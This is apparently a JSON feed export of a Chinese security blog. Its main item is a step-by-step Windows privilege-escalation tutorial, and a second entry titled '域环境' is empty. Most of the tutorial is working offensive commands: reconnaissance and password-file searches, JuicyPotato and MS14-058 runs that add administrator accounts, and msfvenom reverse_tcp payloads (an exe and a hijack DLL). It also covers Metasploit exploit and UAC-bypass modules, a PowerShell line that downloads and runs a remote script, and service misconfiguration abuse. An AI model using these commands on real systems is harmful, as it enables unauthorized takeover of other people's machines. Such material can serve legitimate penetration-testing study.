{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg • All posts by \"内网安全\" category",
    "description": "",
    "home_page_url": "http://gyzero.shop",
    "items": [
        {
            "id": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "title": "Windows提权",
            "date_published": "2023-11-09T12:28:50.000Z",
            "content_html": "<h3 id=\"提权基础\"><a class=\"markdownIt-Anchor\" href=\"#提权基础\">#</a> <span class=\"label\">提权基础</span></h3>\n<p>获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利</p>\n<p>windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。</p>\n<p>使用 Windows 命令提示符执行的，它将系统信息输出到名为 &quot;a.txt&quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &quot;a.txt</p>\n<p>systeminfo&gt;a.txt&amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png\" alt=\"image-20231110225111274\"></p>\n<p>提权辅助:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v\">https://i.hacking8.com/tiquan/</span></p>\n<p>windows 漏洞集合<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\"> https://github.com/SecWiki/windows-kernel-exploits</span></p>\n<h3 id=\"收集信息常用命令\"><a class=\"markdownIt-Anchor\" href=\"#收集信息常用命令\">#</a> <span class=\"label\">收集信息常用命令</span></h3>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ipconfig /all                                            --网卡配置</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>systeminfo                                               --系统补丁信息等</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>wmic product get name,version                            --安装软件、版本、路径</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>wmic service list brief                                  --查询本机服务信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>tasklist -svc                                            --进程查看</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>schtasks /query /fo list /v                              --任务计划查询</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>net statistics workstation                               --开机时间</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>net user                                                 --查看用户</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>whoami /all                                              --SID等用户信息</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>net localgroup administrators                            --查看管理员组中的用户</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>net session                                              --会话查看</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>netstat -ano                                             --网络连接以及通过端口判断服务</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>net share                                                --共享</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>route print                                              --路由信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>arp -a                                                   --arp信息</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cmdkey /l                                                --登录历史</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hosts文件  Linux：/etc/hosts  Windows：c:\\Windows\\system32\\drivers\\etc\\hosts</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ipconfig  /displaydns                                    --dns缓存</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>net view                                                 --查看共享</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>dir /s /b \"pass\" \"user\" \"config\" \"username.\" \"password.\" --命令行查找敏感文件</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>findstr  /s /m \"password\" *.*                            --寻找包含密码字段的文件，如数据库密码文件</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>net user /domain                                         --查看域用户</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>net time /domain                                         --查看时间服务器（可能为DC）</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>net group \"domain admins\" /domain                        --查看域管理员</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>net group \"domaincontrollers\" /domain                    --查看域控制器</pre></td></tr></table></figure><p>net user 显示当前系统中的所有用户信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110133913521.png\" alt=\"image-20231110133913521\"></p>\n<p>net user 31166 查看用户详细信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134358877.png\" alt=\"image-20231110134358877\"></p>\n<h4 id=\"whoami-all\"><a class=\"markdownIt-Anchor\" href=\"#whoami-all\">#</a> <span class=\"label\">whoami /all</span></h4>\n<p>获取当前用户详细信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134649977.png\" alt=\"image-20231110134649977\"></p>\n<h4 id=\"hostname\"><a class=\"markdownIt-Anchor\" href=\"#hostname\">#</a> <span class=\"label\">hostname</span></h4>\n<p>获取主机名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134745836.png\" alt=\"image-20231110134745836\"></p>\n<h4 id=\"whoami-priv\"><a class=\"markdownIt-Anchor\" href=\"#whoami-priv\">#</a> <span class=\"label\">whoami /priv</span></h4>\n<p>获取当前用户的安全特权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134929728.png\" alt=\"image-20231110134929728\"></p>\n<h4 id=\"net-start\"><a class=\"markdownIt-Anchor\" href=\"#net-start\">#</a> <span class=\"label\">net start</span></h4>\n<p>获取已经启动的 Windows 服务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110135119067.png\" alt=\"image-20231110135119067\"></p>\n<h4 id=\"systeminfo\"><a class=\"markdownIt-Anchor\" href=\"#systeminfo\">#</a> <span class=\"label\">systeminfo</span></h4>\n<p>获取电脑打了那些补丁为之后提权打下基础</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151656666.png\" alt=\"image-20231110151656666\"></p>\n<h4 id=\"扫描可写可读目录\"><a class=\"markdownIt-Anchor\" href=\"#扫描可写可读目录\">#</a> <span class=\"label\">扫描可写可读目录</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151233596.png\" alt=\"image-20231110151233596\"></p>\n<h3 id=\"windows常用提权\"><a class=\"markdownIt-Anchor\" href=\"#windows常用提权\">#</a> <span class=\"label\">windows 常用提权</span></h3>\n<h4 id=\"ms16-075烂土豆提权\"><a class=\"markdownIt-Anchor\" href=\"#ms16-075烂土豆提权\">#</a> <span class=\"label\">MS16-075 烂土豆提权</span></h4>\n<p>影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012 等</p>\n<p>下载网址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1N3ZWV0UG90YXRv\">https://github.com/uknowsec/SweetPotato</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0p1aWN5UG90YXRvL2Jsb2IvbWFpbi9KdWljeVBvdGF0by1zaGVsbGNvZGUvQmluL0p1aWN5UG90YXRvLmV4ZQ==\">https://github.com/uknowsec/JuicyPotato/blob/main/JuicyPotato-shellcode/Bin/JuicyPotato.exe</span></p>\n<p>找到了可读写目录上传 exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110153059031.png\" alt=\"image-20231110153059031\"></p>\n<p>执行命令</p>\n<p>C:\\inetpub\\wwwroot\\dedecms\\JuicyPotato_x64.exe net user yunyi2 1234567890 /add &amp;&amp; net localgroup administrators yunyi/add</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110160256590.png\" alt=\"image-20231110160256590\"></p>\n<h4 id=\"ms14-058提权\"><a class=\"markdownIt-Anchor\" href=\"#ms14-058提权\">#</a> <span class=\"label\">MS14-058 提权</span></h4>\n<p>具体而言，win32k.sys 是 Windows 子系统的一部分，负责窗口管理和屏幕输出。如果内核模块未正确处理内存中的对象，攻击者可能会通过利用这一漏洞来在内核模式中执行任意代码。成功利用此漏洞的攻击者可以在系统中运行具有更高权限的代码，进而执行一系列危险操作，如安装程序、查看、更改或删除数据，或者创建具有完全管理权限的新账户。</p>\n<p>影响版本<br>\n Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下</p>\n<p>上传 exe 到可执行目录</p>\n<p>whoami 看到已经是 nt authority\\system</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182725492.png\" alt=\"image-20231110182725492\"></p>\n<p>64.exe “net user yunyi 123456 /add” 添加用户</p>\n<p>64.exe &quot;net localgroup administrators yunyi /add&quot; 添加到管理员组</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182123803.png\" alt=\"image-20231110182123803\"></p>\n<p>远程端口连接成功</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182617605.png\" alt=\"image-20231110182617605\"></p>\n<h4 id=\"cve-2020-0787\"><a class=\"markdownIt-Anchor\" href=\"#cve-2020-0787\">#</a> <span class=\"label\">CVE-2020-0787</span></h4>\n<p>影响版本</p>\n<p>Windows 10 Version 1809 for ARM64-based Systems<br>\nWindows Server 2008 for 32-bit Systems Service Pack 2<br>\nWindows RT 8.1<br>\nWindows 8.1 for x64-based systems<br>\nWindows 8.1 for 32-bit systems<br>\nWindows 7 for x64-based Systems Service Pack 1<br>\nWindows 7 for 32-bit Systems Service Pack 1<br>\nWindows Server 2016 (Server Core installation)<br>\nWindows Server 2016<br>\nWindows 10 Version 1607 for x64-based Systems<br>\nWindows 10 Version 1607 for 32-bit Systems<br>\nWindows 10 for x64-based Systems<br>\nWindows 10 for 32-bit Systems<br>\nWindows Server, version 1903 (Server Core installation)<br>\nWindows 10 Version 1903 for ARM64-based Systems<br>\nWindows 10 Version 1903 for x64-based Systems<br>\nWindows 10 Version 1903 for 32-bit Systems<br>\nWindows 10 Version 1709 for ARM64-based Systems<br>\nWindows 10 Version 1709 for x64-based Systems<br>\nWindows 10 Version 1709 for 32-bit Systems<br>\nWindows Server, version 1909 (Server Core installation)<br>\nWindows 10 Version 1909 for ARM64-based Systems<br>\nWindows 10 Version 1909 for x64-based Systems<br>\nWindows 10 Version 1909 for 32-bit Systems<br>\nWindows Server 2019 (Server Core installation)<br>\nWindows Server 2019<br>\nWindows Server 2012 R2 (Server Core installation)<br>\nWindows Server 2012 R2<br>\nWindows Server 2012 (Server Core installation)<br>\nWindows Server 2012<br>\nWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>\nWindows Server 2008 R2 for x64-based Systems Service Pack 1<br>\nWindows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>\nWindows Server 2008 for x64-based Systems Service Pack 2<br>\nWindows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>\nWindows 10 Version 1809 for x64-based Systems<br>\nWindows 10 Version 1809 for 32-bit Systems<br>\nWindows 10 Version 1803 for ARM64-based Systems<br>\nWindows Server, version 1803 (Server Core Installation)<br>\nWindows 10 Version 1803 for x64-based Systems<br>\nWindows 10 Version 1803 for 32-bit Systems</p>\n<p>脚本地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nid2FuZzUwNS9DVkUtMjAyMC0wNzg3LUVYUC1BTEwtV0lORE9XUy1WRVJTSU9OL3JlbGVhc2VzL3RhZy8x\">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1</span></p>\n<p>要求上桌面执行，会弹出系统权限的 cmd</p>\n<p>把 exe 上传后切换上面创建的用户登陆桌面</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185051791.png\" alt=\"image-20231110185051791\"></p>\n<p>执行后弹出 cmd</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185214126.png\" alt=\"image-20231110185214126\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185227277.png\" alt=\"image-20231110185227277\"></p>\n<h3 id=\"msf利用\"><a class=\"markdownIt-Anchor\" href=\"#msf利用\">#</a> <span class=\"label\">msf 利用</span></h3>\n<p>先生成一个木马文件</p>\n<p>msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=8989-f exe &gt;/vs.exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110211226995.png\" alt=\"image-20231110211226995\"></p>\n<p>msf 打开监听</p>\n<p>use exploit/multi/handler</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n<p>set lhost 192.168.27.11</p>\n<p>set lport 8989</p>\n<p>exploit</p>\n<p>用 webshell 上传到受害机执行木马文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213027928.png\" alt=\"image-20231110213027928\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213439218.png\" alt=\"image-20231110213439218\"></p>\n<p>跟之前一样查看打了那些补丁</p>\n<p>输入 shell 获取 cmd 使用 systeminfo 获取到信息后跟之前一样去找可以用的提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214317729.png\" alt=\"image-20231110214317729\"></p>\n<p>用 background 命令把会话放在后台，可以用 session 查看已建立的会话信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214725591.png\" alt=\"image-20231110214725591\"></p>\n<p>search ms14_058 查找漏洞信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214943295.png\" alt=\"image-20231110214943295\"></p>\n<p>use exploit/windows/local/ms14_058_track_popup_menu</p>\n<p>show options 查看利用要求</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110215511454.png\" alt=\"image-20231110215511454\"></p>\n<p>设置会话 id 刚才看的是 session 2 所以设置为 2</p>\n<p>set session 2</p>\n<p>然后 exploit 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110220237813.png\" alt=\"image-20231110220237813\"></p>\n<p>use exploit/windows/local/ms16_075_reflection_juicy</p>\n<p>ms14_058 没有成功所以换了 ms16 _075 成功获取 system 权限</p>\n<p>切换 shell 添加用户并加入管理员</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221425934.png\" alt=\"image-20231110221425934\"></p>\n<p>维权</p>\n<p>ps 列出进程</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221951490.png\" alt=\"image-20231110221951490\"></p>\n<p>migrate 1184</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110222507771.png\" alt=\"image-20231110222507771\"></p>\n<h3 id=\"uac提权\"><a class=\"markdownIt-Anchor\" href=\"#uac提权\">#</a> <span class=\"label\">UAC 提权</span></h3>\n<p>用户账户控制（UAC）是 Windows 操作系统中的一项安全特性。它旨在帮助防止未经授权的对计算机的更改。当一个程序尝试执行需要管理员权限的更改时，UAC 会通知用户并在允许更改之前征得用户的确认。</p>\n<p>UAC 通过确保只有在用户明确同意的情况下才执行管理操作，有助于降低未经授权的更改和恶意软件安装的风险。这样，即使用户以管理员身份登录，他们仍然需要确认他们意图执行可能对系统造成影响的某些操作。</p>\n<p>前提：已获取目标本地用户权限</p>\n<p>上传 msf 木马执行</p>\n<p>现在为普通用户权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102136583.png\" alt=\"image-20231111102136583\"></p>\n<p>search 搜索一下 UAC 利用模块</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111100615934.png\" alt=\"image-20231111100615934\"></p>\n<p>使用 exploit/windows/local/bypassuac 模块</p>\n<p>set session 5</p>\n<p>run</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102853388.png\" alt=\"image-20231111102853388\"></p>\n<p>执行成功过后再使用 getsystem</p>\n<p>getuid 查看已经是 system 权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102946311.png\" alt=\"image-20231111102946311\"></p>\n<h3 id=\"windows系统配置错误提权\"><a class=\"markdownIt-Anchor\" href=\"#windows系统配置错误提权\">#</a> <span class=\"label\">windows 系统配置错误提权</span></h3>\n<h4 id=\"系统服务权限配置错误\"><a class=\"markdownIt-Anchor\" href=\"#系统服务权限配置错误\">#</a> <span class=\"label\">系统服务权限配置错误</span></h4>\n<p>Windows 在系统启动时，会伴随着一些高权服务启动 (windows 服务是以 system 权限运行的) 如果某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持</p>\n<p>如果一个低权限用户对系统服务调用的可执行文件有写权限，他们可以替换该文件，并在系统启动时获取控制权限。尽管 Windows 服务以 system 权限运行，其文件夹、文件和注册表项受到强制访问控制的保护，但在某些情况下，仍可能存在一些缺乏有效保护的服务。</p>\n<p><span class=\"label\">Metasploit</span></p>\n<p>上线木马当前是 iis 权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112119228.png\" alt=\"image-20231111112119228\"></p>\n<p>background 把会话放在后台</p>\n<p>切换到 use exploit/windows/local/service_permissions 攻击模块</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112359457.png\" alt=\"image-20231111112359457\"></p>\n<p>set session 4</p>\n<p>设置为 session 4</p>\n<p>exploit 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112807154.png\" alt=\"image-20231111112807154\"></p>\n<p><span class=\"label\">PrivescCheck</span></p>\n<p>脚本地址<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2l0bTRuL1ByaXZlc2NDaGVjaw==\"> https://github.com/itm4n/PrivescCheck</span></p>\n<p>列举共同 Windows 配置问题  ，可以利用当地的权限升级</p>\n<p>使用 1:   基本的使用情况</p>\n<pre><code>powershell -ep bypass -c &quot;. .\\PrivescCheck.ps1; Invoke-PrivescCheck&quot;\n</code></pre>\n<p>远程使用</p>\n<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object \nNet.WebClient).DownloadString('http://192.168.27.11/PrivescCheck.ps1'); Invoke-PrivescCheck&quot;\n</code></pre>\n<p><span class=\"label\">PowerUp</span></p>\n<p>导入并执行脚本 powershell.exe -exec bypass -command “&amp;{Import-Module .\\PowerUp.ps1;Invoke-AllChecks}”</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111173012800.png\" alt=\"image-20231111173012800\"></p>\n<p>StartName    : LocalSystem</p>\n<p>AbuseFunction  : Install-ServiceBinary -ServiceName ‘MongoDB’</p>\n<p>利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当可直接添加管理员用户</p>\n<p>添加管理员</p>\n<p>powershell.exe -exec bypass -command “&amp;{Import-Module .\\PowerUp.ps1;Install-ServiceBinary -ServiceName ‘MongoDB’ -UserName yunyi4 -Password admin}”</p>\n<p>服务被重启或者计算机重启后就可以添加成功了</p>\n<h4 id=\"不带引号的服务路径\"><a class=\"markdownIt-Anchor\" href=\"#不带引号的服务路径\">#</a> <span class=\"label\">不带引号的服务路径</span></h4>\n<p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>\n<p>使用命令查看服务器存在空格，路径可写 即存在漏洞</p>\n<p>wmic service get name,displayname,pathname,startmode |findstr /i “Auto” |findstr /i /v “C:\\Windows\\” |findstr /i /v “”&quot;</p>\n<p>例如</p>\n<p>C:\\Program Files<br>\n(x86)\\2345Soft\\2345Pic\\protect\\Pic_2345Svc.exe    Auto</p>\n<p>这种存在空格</p>\n<p>msf 生成一个 program.exe 放在 c 应用重启即可上线</p>\n<h3 id=\"dll劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#dll劫持提权\">#</a> <span class=\"label\">DLL 劫持提权</span></h3>\n<p>查看应用进程找数字签名或者未知文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191157012.png\" alt=\"image-20231111191157012\"></p>\n<p>生成一个名字一样的 dll 并且替换</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=6789 -f dll &gt; /root/2345MgrDLL.dll</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191517160.png\" alt=\"image-20231111191517160\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191909318.png\" alt=\"image-20231111191909318\"></p>\n<p>msf 上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111192614857.png\" alt=\"image-20231111192614857\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/",
            "url": "http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/",
            "title": "域环境",
            "date_published": "2023-10-30T04:00:34.000Z",
            "content_html": "",
            "tags": []
        }
    ]
}